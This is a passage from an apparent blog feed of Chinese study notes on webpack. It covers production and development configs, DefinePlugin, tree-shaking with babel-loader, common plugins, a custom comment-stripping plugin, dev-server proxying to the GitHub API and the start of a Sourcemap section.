会触发图片元素重新加载，从而局部更新图片</span></span><br><span class="line">    img.src = background</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h2 id="生产环境优化"><a href="#生产环境优化" class="headerlink" title="生产环境优化"></a>生产环境优化</h2><blockquote><p>模式 （mode）：为不同的工作环境创建不同的配置</p><ol><li>配置文件根据环境不同导出不同配置</li><li>一个环境对应一个配置文件</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; CleanWebpackPlugin &#125; = <span class="built_in">require</span>(<span class="string">'clean-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> CopyWebpackPlugin = <span class="built_in">require</span>(<span class="string">'copy-webpack-plugin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">env, argv</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> config = &#123;</span><br><span class="line"><span class="comment">// 正常配置</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (env === <span class="string">'production'</span>) &#123;</span><br><span class="line">    config.mode = <span class="string">'production'</span></span><br><span class="line">    config.devtool = <span class="literal">false</span></span><br><span class="line">    config.plugins = [</span><br><span class="line">      ...config.plugins,</span><br><span class="line">      <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">      <span class="keyword">new</span> CopyWebpackPlugin([<span class="string">'public'</span>]) <span class="comment">// 生产环境需要 copy 图片等</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> config</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时在命令行中运行：webpack --env production</span></span><br></pre></td></tr></table></figure><p>若一个环境对应一个配置文件，则项目中需要有三个配置文件</p><ul><li>webpack.common.js：存放一些公共的配置</li><li>webpack.dev.js</li><li>webpack.prod.js</li></ul><p>此时还需要安装一个插件<code>webpack-merge</code>，实现在原有基础上添加插件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> common = <span class="built_in">require</span>(<span class="string">'./webpack.common'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = merge(common, &#123;</span><br><span class="line">  mode: <span class="string">'development'</span>,</span><br><span class="line">  devtool: <span class="string">'cheap-eval-module-source-map'</span>,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    hot: <span class="literal">true</span>,</span><br><span class="line">    contentBase: <span class="string">'public'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.HotModuleReplacementPlugin()</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>此时命令行则需要输入<code>webpack --config webpack.prod.js</code></p><h2 id="DefinePlugin"><a href="#DefinePlugin" class="headerlink" title="DefinePlugin"></a>DefinePlugin</h2><blockquote><p>为代码注入全局成员</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="comment">// 值要求的是一个代码片段</span></span><br><span class="line">      API_BASE_URL: <span class="built_in">JSON</span>.stringify(<span class="string">'https://api.example.com'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="built_in">console</span>.log(API_BASE_URL)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行 webpack 打包后查看bundle.js,发现在最后添加了代码</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"https://api.example.com"</span>)</span><br></pre></td></tr></table></figure><h2 id="Tree-shaking"><a href="#Tree-shaking" class="headerlink" title="Tree-shaking"></a>Tree-shaking</h2><p>摇掉那些未引用的代码，减小代码体积，在生产模式下会自动开启<code>webpack --mode production</code></p><p>不是生产环境需要手动配置，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/index.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 优化操作</span></span><br><span class="line">  optimization: &#123;</span><br><span class="line">    <span class="comment">// 负责标记枯树叶</span></span><br><span class="line">    usedExports: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 负责摇掉枯树叶</span></span><br><span class="line">    minimize: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 尽可能合并每一个模块到一个函数中,可以看到 bundle.js 模块数量减少了</span></span><br><span class="line">    <span class="comment">// concatenateModules: true,</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// components.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Button = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">document</span>.createElement(<span class="string">'button'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'dead-code'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Link = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Heading = <span class="function"><span class="params">level</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">document</span>.createElement(<span class="string">'h'</span> + level)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.js,只有Button被使用</span></span><br><span class="line"><span class="keyword">import</span> &#123; Button &#125; <span class="keyword">from</span> <span class="string">'./components'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(Button())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常用 webpack 命令打包时，在 bundle.js 中搜不到 Link, Heading，console.log</span></span><br></pre></td></tr></table></figure><h4 id="问题：使用babel-loader后，Tree-shaking会失效？"><a href="#问题：使用babel-loader后，Tree-shaking会失效？" class="headerlink" title="问题：使用babel-loader后，Tree-shaking会失效？"></a>问题：使用<code>babel-loader</code>后，Tree-shaking会失效？</h4><ul><li>由webpack打包的代码必须使用ES Modules，先交给loader处理，然后再打包</li><li>而babel转换时，可能会将 ES Module 转换成 CommonJS ,就会失效，但是最新版的babel没问题</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/index.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            presets: [</span><br><span class="line">              <span class="comment">// 如果 Babel 加载模块时已经转换了 ESM，则会导致 Tree Shaking 失效</span></span><br><span class="line">              <span class="comment">// ['@babel/preset-env', &#123; modules: 'commonjs' &#125;]</span></span><br><span class="line">                </span><br><span class="line">              <span class="comment">// 设置为false就不会开启转换</span></span><br><span class="line">              <span class="comment">// ['@babel/preset-env', &#123; modules: false &#125;]</span></span><br><span class="line">                </span><br><span class="line">              <span class="comment">// 也可以使用默认配置，也就是 auto，这样 babel-loader 会自动关闭 ESM 转换</span></span><br><span class="line">              [<span class="string">'@babel/preset-env'</span>, &#123; <span class="attr">modules</span>: <span class="string">'auto'</span> &#125;]</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    <span class="comment">// 模块只导出被使用的成员</span></span><br><span class="line">    usedExports: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 尽可能合并每一个模块到一个函数中</span></span><br><span class="line">    <span class="comment">// concatenateModules: true,</span></span><br><span class="line">    <span class="comment">// 压缩输出结果</span></span><br><span class="line">    <span class="comment">// minimize: true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（二）</title>
      <link href="2020/09/06/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2020/09/06/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>webpack插件机制</li><li>webpack dev server</li><li>Sourcemap</li></ul><a id="more"></a><h2 id="webpack插件机制"><a href="#webpack插件机制" class="headerlink" title="webpack插件机制"></a>webpack插件机制</h2><ul><li>Loader专注实现资源模块加载</li><li>Plugin解决其他自动化工作<ul><li>清除dist目录</li><li>拷贝静态文件至输出目录</li><li>压缩输出代码</li></ul></li></ul><p>webpack + plugin 基本实现了前端工程化</p><h3 id="clean-webpack-plugin"><a href="#clean-webpack-plugin" class="headerlink" title="clean-webpack-plugin"></a>clean-webpack-plugin</h3><blockquote><p>作用： 清除dist目录插件</p></blockquote><p><code>cnpmm install -D clean-webpack-plugin</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; CleanWebpackPlugin &#125; = <span class="built_in">require</span>(<span class="string">'clean-webpack-plugin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// 新增</span></span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin()</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="html-webpack-plugin"><a href="#html-webpack-plugin" class="headerlink" title="html-webpack-plugin"></a>html-webpack-plugin</h3><blockquote><p>作用：自动生成引用bundle.js的html文件</p></blockquote><p><code>cnpm install -D html-webpack-plugin</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>),</span><br><span class="line">    <span class="comment">// publicPath: 'dist/'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">    <span class="comment">// 用于生成 index.html</span></span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      title: <span class="string">'Webpack Plugin Sample'</span>,</span><br><span class="line">      meta: &#123;</span><br><span class="line">        viewport: <span class="string">'width=device-width'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      template: <span class="string">'./src/index.html'</span> <span class="comment">// 模板</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="comment">// 用于生成 about.html</span></span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      filename: <span class="string">'about.html'</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="copy-webpack-plugin"><a href="#copy-webpack-plugin" class="headerlink" title="copy-webpack-plugin"></a>copy-webpack-plugin</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">   <span class="keyword">new</span> CopyWebpackPlugin([</span><br><span class="line">     <span class="comment">// 'public/**'</span></span><br><span class="line">     <span class="string">'public'</span></span><br><span class="line">   ])</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><h3 id="插件原理"><a href="#插件原理" class="headerlink" title="插件原理"></a>插件原理</h3><blockquote><p>webpack过程中存在钩子函数，插件挂载在其上面</p><p>例：实现移除bundle.js中的注释</p></blockquote><h3 id="理解Compiler（负责编译）"><a href="#理解Compiler（负责编译）" class="headerlink" title="理解Compiler（负责编译）"></a>理解Compiler（负责编译）</h3><p>开发插件首先要知道<code>compiler</code>和 <code>compilation</code> 对象是做什么的</p><p><code>Compiler</code> 对象包含了当前运行<code>Webpack</code>的配置，包括<code>entry、output、loaders</code>等配置，这个对象在启动<code>Webpack</code>时被实例化，而且是全局唯一的。<code>Plugin</code>可以通过该对象获取到Webpack的配置信息进行处理。</p><h3 id="理解Compilation"><a href="#理解Compilation" class="headerlink" title="理解Compilation"></a>理解Compilation</h3><p><code>Compilation</code>对象代表了一次资源版本构建。当运行 <code>webpack</code> 开发环境中间件时，每当检测到一个文件变化，就会创建一个新的 <code>compilation</code>，从而生成一组新的编译资源。一个 <code>Compilation</code> 对象表现了当前的模块资源、编译生成资源、变化的文件、以及被跟踪依赖的状态信息，简单来讲就是把本次打包编译的内容存到内存里。<code>Compilation</code> 对象也提供了插件需要自定义功能的回调，以供插件做自定义处理时选择使用拓展。</p><p><code>apply</code>方法中插入钩子的一般形式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiler提供了compiler.hooks，可以根据这些不同的时刻去让插件做不同的事情。</span></span><br><span class="line"></span><br><span class="line">compiler.hooks.阶段.tap函数(<span class="string">'插件名称'</span>, (阶段回调参数) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">compiler.run(callback)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPlugin</span> </span>&#123;</span><br><span class="line">  apply (compiler) &#123; <span class="comment">// compiler对象为webpack一核心对象，通过他来找钩子函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'MyPlugin 启动'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Webpack 会调用 Plugin 实例的 apply 方法给插件实例传入 compiler 对象</span></span><br><span class="line">    compiler.hooks.emit.tap(<span class="string">'MyPlugin'</span>, compilation =&gt; &#123; <span class="comment">// 挂载在emit方法上</span></span><br><span class="line">      <span class="comment">// compilation =&gt; 可以理解为此次打包的上下文</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> name <span class="keyword">in</span> compilation.assets) &#123;</span><br><span class="line">        <span class="comment">// console.log(name)                              // 输出文件名</span></span><br><span class="line">        <span class="comment">// console.log(compilation.assets[name].source()) // 输出文件内容 </span></span><br><span class="line">        <span class="keyword">if</span> (name.endsWith(<span class="string">'.js'</span>)) &#123;</span><br><span class="line">          <span class="keyword">const</span> contents = compilation.assets[name].source() <span class="comment">// 获取内容</span></span><br><span class="line">          <span class="keyword">const</span> withoutComments = contents.replace(<span class="regexp">/\/\*\*+\*\//g</span>, <span class="string">''</span>) <span class="comment">// 删除注释</span></span><br><span class="line">          compilation.assets[name] = &#123;</span><br><span class="line">            source: <span class="function"><span class="params">()</span> =&gt;</span> withoutComments, <span class="comment">// 替换内容</span></span><br><span class="line">            size: <span class="function"><span class="params">()</span> =&gt;</span> withoutComments.length <span class="comment">// 必要注释：长度</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">plugins: [</span><br><span class="line">    <span class="keyword">new</span> MyPlugin()</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><h2 id="webpack-dev-server"><a href="#webpack-dev-server" class="headerlink" title="webpack-dev-server"></a>webpack-dev-server</h2><p><strong>如何自动编译：修改源文件后自动打包</strong></p><p>只需要在启动<code>webpack</code>命令时，添加<code>webpack --watch</code>即可</p><p><strong>如何自动刷新浏览器</strong></p><p>使用<code>browser-sync</code>：<code>browser-sync dist --files &quot;**/*&quot;</code></p><blockquote><p>组合这两种方式可以实现，修改源文件时自动刷新浏览器。</p><p>缺点：1. 操作复杂：需要同时运行两个终端命令。2. 消耗大：先打包写入磁盘，再读出磁盘刷新浏览器</p></blockquote><p><strong>webpack-dev-server</strong></p><p><code>webpack dev server</code>：将自动编译和自动刷新集成在一起</p><p>安装：<code>cnpm install -D webpack-dev-server</code></p><blockquote><p>优点：不会生成dist目录造成磁盘读写操作，均存储在内存中</p><p>webpack-dev-server –open 命令可自动打开浏览器</p></blockquote><p><strong>静态资源文件的处理</strong></p><blockquote><p>在开发阶段，因为要频繁的打包和编译，尽量不将图片等静态资源文件一起打包到dist目录中</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    contentBase: <span class="string">'./public'</span>, <span class="comment">// 使用contentBase来设置</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// // 开发阶段最好不要使用这个插件</span></span><br><span class="line">    <span class="comment">// new CopyWebpackPlugin(['public'])</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy代理"><a href="#proxy代理" class="headerlink" title="proxy代理"></a>proxy代理</h3><blockquote><p> 由于 webpack-dev-server 是一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上。但是最终上线过后，我们的应用一般又会和后端服务部署到同源地址下。</p><p>​    那这样就会出现一个非常常见的问题：在实际生产环境中能够直接访问的 API，回到我们的开发环境后，再次访问这些 API 就会产生跨域请求问题。</p><p>​    可能有人会说，我们可以用跨域资源共享（CORS）解决这个问题。确实如此，如果我们请求的后端 API 支持 CORS，那这个问题就不成立了。但是并不是每种情况下服务端的 API 都支持 CORS。如果前后端应用是同源部署，也就是协议 / 域名 / 端口一致，那这种情况下，根本没必要开启 CORS，所以跨域请求的问题仍然是不可避免的。</p><p>​    那解决这种开发阶段跨域请求问题最好的办法，就是在开发服务器中配置一个后端 API 的代理服务，也就是把后端接口服务代理到本地的开发服务地址。</p><p>​    webpack-dev-server 就支持直接通过配置的方式，添加代理服务。接下来，我们来看一下它的具体用法。</p><p>比如我们假定 GitHub 的 API 就是我们应用的后端服务，那我们的目标就是将 GitHub API 代理到本地开发服务器中，我们可以先在浏览器中尝试访问其中的一个接口： <a href="https://api.github.com/users/mojombo/followers" target="_blank" rel="noopener">https://api.github.com/users</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    contentBase: <span class="string">'./public'</span>,</span><br><span class="line">    proxy: &#123;</span><br><span class="line">      <span class="string">'/api'</span>: &#123;</span><br><span class="line">        <span class="comment">// http://localhost:8080/api/users -&gt; https://api.github.com/api/users</span></span><br><span class="line">        target: <span class="string">'https://api.github.com'</span>,</span><br><span class="line">        <span class="comment">// http://localhost:8080/api/users -&gt; https://api.github.com/users</span></span><br><span class="line">        pathRewrite: &#123;</span><br><span class="line">          <span class="string">'^/api'</span>: <span class="string">''</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 不能使用 localhost:8080 作为请求 GitHub 的主机名</span></span><br><span class="line">        changeOrigin: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200531181008355.png" alt="1"></p><p>那此时我们请求 <a href="http://localhost:8080/api/users" target="_blank" rel="noopener">http://localhost:8080/api/users</a> ，就相当于请求了 <a href="https://api.github.com/users" target="_blank" rel="noopener">https://api.github.com/users</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此时再写跨域请求，就可正常访问</span></span><br><span class="line"><span class="comment">// 虽然 GitHub 支持 CORS，但是不是每个服务端都应该支持。</span></span><br><span class="line"><span class="comment">// fetch('https://api.github.com/users')</span></span><br><span class="line">fetch(<span class="string">'/api/users'</span>) <span class="comment">// 实际请求到http://localhost:8080/api/users</span></span><br><span class="line">  .then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    data.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> li = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>)</span><br><span class="line">      li.textContent = item.login</span><br><span class="line">      ul.append(li)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h2 id="Sourcemap"><a href="#Sourcemap" class="headerlink" title="Sourcemap"></a>Sourcemap</h2><blockquote><p>SourceMap是一种映射关系。当项目运行后，如果出现错误，错误信息只能定位到打包后文件中错误的位置。如果想查看在源文件中错误的位置，则需要使用映射关系，找到对应的位置。</p></blockquote><p>那么如何在webpack中配置Sourcemap呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 